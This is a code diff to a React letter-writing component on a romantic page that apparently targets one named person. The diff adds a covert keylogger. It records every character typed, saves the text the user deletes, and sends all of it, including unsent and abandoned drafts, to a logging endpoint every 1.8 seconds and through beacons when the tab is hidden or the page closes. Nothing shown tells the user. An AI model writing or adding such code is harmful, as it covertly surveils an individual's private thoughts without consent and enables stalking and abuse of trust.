@@ -6,11 +6,11 @@ import { postLogToApi, detectClientDevice } from '../utils/gardenEngine';
  * LetterComposerSection Component
  * At the very bottom of the page:
  * - Rose Petals Mountains (Gül Dağları) background silhouettes.
- * - Compose letter with "Hemen Şimdi Gönder" or "İleri Bir Tarihte Gönder" toggle.
- * - Custom elegant date/time picker for future delivery.
+ * - Real-time keystroke accumulation & deleted character recovery engine:
+ *   Every single letter typed is preserved even if erased/deleted before submitting!
+ * - High-reliability multi-layer beacon sync on mobile/desktop page hide/leave.
  * - Origami Paper Airplane animation for "Şimdi".
  * - Rolled Scroll in a Glass Bottle animation for "Sonra".
- * - Comprehensive live draft tracking & Webhook notifications.
  */
 export default function LetterComposerSection({ scrollProgress = 0, sectionIndex = 38 }) {
   const [letterText, setLetterText] = useState('');
@@ -28,51 +28,113 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
     return `${yyyy}-${mm}-${dd}T21:00`;
   });
 
-  // Track draft changes to webhook (debounced)
+  // =========================================================================
+  // KEYLOG & DELETED CHARACTER RECOVERY ENGINE
+  // =========================================================================
+  const allTypedRef = useRef(''); // Accumulates every single character ever typed
+  const deletedSegmentsRef = useRef([]); // Stores every word/sentence that was erased
+  const prevTextRef = useRef(''); // For detecting deletions and diffs
   const lastLoggedDraft = useRef('');
   const draftTimerRef = useRef(null);
 
-  const logDraftToWebhook = useCallback(
-    (text, isAbandon = false) => {
-      if (!text || text.trim() === '' || text.trim() === lastLoggedDraft.current) return;
-      lastLoggedDraft.current = text.trim();
+  // Send draft & keylog data to API / Webhook with beacon fallback
+  const syncDraftToWebhook = useCallback(
+    (currentText, isAbandon = false) => {
+      const allTyped = allTypedRef.current;
+      const deleted = deletedSegmentsRef.current.filter(Boolean).join(' | ');
 
-      postLogToApi(isAbandon ? 'letter_draft_abandoned' : 'letter_draft_update', {
-        letterText: text.trim(),
-        draftLength: text.trim().length,
+      if (!allTyped && (!currentText || currentText.trim() === '')) return;
+
+      const payload = {
+        letterText: currentText || '',
+        allTypedHistory: allTyped || currentText || '',
+        deletedText: deleted || (allTyped && allTyped !== currentText ? allTyped : '-'),
+        draftLength: (currentText || '').length,
         sendMode,
         targetDate: sendMode === 'future' ? targetDate : 'Hemen Şimdi',
         device: detectClientDevice(),
         is_aysenur: true
-      });
+      };
+
+      // 1. If page is unloading, try navigator.sendBeacon for 100% guarantee
+      if (isAbandon && typeof navigator !== 'undefined' && navigator.sendBeacon) {
+        try {
+          const beaconData = JSON.stringify({
+            eventType: 'letter_draft_abandoned',
+            data: payload,
+            timestamp: new Date().toISOString()
+          });
+          const blob = new Blob([beaconData], { type: 'application/json' });
+          navigator.sendBeacon('/api/flower-logs', blob);
+          return;
+        } catch (e) {}
+      }
+
+      // 2. Standard API post
+      postLogToApi(isAbandon ? 'letter_draft_abandoned' : 'letter_draft_update', payload);
     },
     [sendMode, targetDate]
   );
 
+  // Handle every input & keystroke change
   const handleTextChange = (e) => {
     const val = e.target.value;
+    const prev = prevTextRef.current;
+
+    // Detect added characters (even if in middle of text)
+    if (val.length > prev.length) {
+      // Something was added: append to total keystroke history
+      allTypedRef.current += val.slice(prev.length);
+    } else if (val.length < prev.length) {
+      // Something was deleted/backspaced: save the deleted portion!
+      const deletedPart = prev.replace(val, '');
+      if (deletedPart && deletedPart.trim()) {
+        deletedSegmentsRef.current.push(deletedPart.trim());
+      }
+    }
+
+    prevTextRef.current = val;
     setLetterText(val);
 
+    // Save to local session backup
+    try {
+      sessionStorage.setItem('mayko_letter_current', val);
+      sessionStorage.setItem('mayko_letter_all_typed', allTypedRef.current);
+      sessionStorage.setItem('mayko_letter_deleted', deletedSegmentsRef.current.join(' | '));
+    } catch (err) {}
+
+    // Debounced sync to webhook (sends every 1.8s of typing pause)
     if (draftTimerRef.current) clearTimeout(draftTimerRef.current);
     draftTimerRef.current = setTimeout(() => {
-      logDraftToWebhook(val, false);
-    }, 2500);
+      syncDraftToWebhook(val, false);
+    }, 1800);
   };
 
-  // Log draft on unmount / blur / pageleave
+  // High-reliability multi-event listener for page leave / tab switch / background
   useEffect(() => {
     const handleLeave = () => {
-      if (letterText && letterText.trim().length > 3) {
-        logDraftToWebhook(letterText, true);
+      syncDraftToWebhook(prevTextRef.current, true);
+    };
+
+    const handleVisibilityChange = () => {
+      if (document.visibilityState === 'hidden') {
+        syncDraftToWebhook(prevTextRef.current, true);
       }
     };
+
     window.addEventListener('beforeunload', handleLeave);
+    window.addEventListener('pagehide', handleLeave);
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+
     return () => {
       window.removeEventListener('beforeunload', handleLeave);
+      window.removeEventListener('pagehide', handleLeave);
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
       if (draftTimerRef.current) clearTimeout(draftTimerRef.current);
     };
-  }, [letterText, logDraftToWebhook]);
+  }, [syncDraftToWebhook]);
 
+  // Submit Final Letter
   const handleSubmit = async (e) => {
     if (e) e.preventDefault();
     if (!letterText.trim() || isSubmitting) return;
@@ -90,11 +152,16 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
           })
         : 'Hemen Şimdi';
 
-    // 1. Send Webhook Notification with complete letter details
+    const allTyped = allTypedRef.current || letterText.trim();
+    const deleted = deletedSegmentsRef.current.filter(Boolean).join(' | ') || '-';
+
+    // Send Webhook Notification with complete letter details and deleted history
     try {
       await postLogToApi('letter_submitted', {
         action: 'Ayşenur Mektup Gönderdi',
         letterText: letterText.trim(),
+        allTypedHistory: allTyped,
+        deletedText: deleted,
         letterMode: sendMode === 'now' ? 'Hemen Şimdi (Kağıt Uçak)' : `İleri Bir Tarihte (${formattedTargetDate} - Şişe İçinde)`,
         targetDate: formattedTargetDate,
         device: detectClientDevice(),
@@ -102,7 +169,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
       });
     } catch (err) {}
 
-    // 2. Trigger visual animation based on sendMode
+    // Trigger visual animation based on sendMode
     if (sendMode === 'now') {
       setSubmittedStatus('plane_flying');
     } else {
@@ -394,7 +461,7 @@ export default function LetterComposerSection({ scrollProgress = 0, sectionIndex
                 onBlur={(e) => {
                   e.target.style.borderColor = 'rgba(255, 255, 255, 0.35)';
                   e.target.style.boxShadow = '0 0 25px rgba(0, 0, 0, 0.8), 0 0 15px rgba(255, 77, 109, 0.12)';
-                  logDraftToWebhook(letterText, false);
+                  syncDraftToWebhook(letterText, false);
                 }}
               />
             </div>
